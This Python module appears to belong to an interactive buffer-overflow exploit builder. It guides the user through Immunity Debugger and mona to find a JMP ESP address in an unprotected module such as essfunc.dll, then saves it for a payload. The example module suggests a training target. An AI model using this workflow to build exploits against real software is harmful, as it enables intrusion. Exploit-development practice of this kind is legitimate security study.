import re

from BunnyBanners import BunnyBanners
from BunnyCommon import BunnyCommon
from BunnyOffset import BunnyOffset
from BunnyConfig import BunnyConfig
from termcolor import colored


class BunnyAddress:
    @staticmethod
    def FindVulnAddress():
        BunnyBanners.PrintVulnAddressBanner()

        print("Let's grab an address to use for our payload\n\n To do that, open immunity and open your program\n\t1: "
              "Type '!mona modules'\n\t2: Look for modules with false in all protection settings\n\t3: Type in '!mona "
              "find -s \"\\xff\\xe4\" -m [module name]' (e.g. essfunc.dll is a module name)\n\t5: Pick an address from\n"
              "the list")
        selectedAddr = input(colored("\n\nWhich address do you wish to try (Enter c to cancel)? ", "yellow"))
        formattedAddr = ""

        if selectedAddr == "c" or selectedAddr == "C":
            input(colored("Operation Cancelled...", "green"))
            return False

        addrMatch = re.match(r'[a-zA-Z0-9]{8}', selectedAddr)
        while not addrMatch:
            input(colored(formattedAddr + " is not a valid address\n", "red"))
            selectedAddr = input(colored("\n\nWhich address do you wish to try? ", "yellow"))

            if selectedAddr == "c" or selectedAddr == "C":
                input(colored("Operation Cancelled...", "green"))
                return False

            addrMatch = re.match(r'[a-zA-Z0-9]{8}', selectedAddr)

        formattedAddr = BunnyCommon.ConvertAddress(selectedAddr)

        BunnyConfig.address = bytes(formattedAddr, 'utf-8')

        print(colored("Vulnerable address set! We are almost there. Let's move onto the fun part.... Exploitation!\n", "green"))

        input(colored("Press enter to continue... ", "yellow"))

        return True
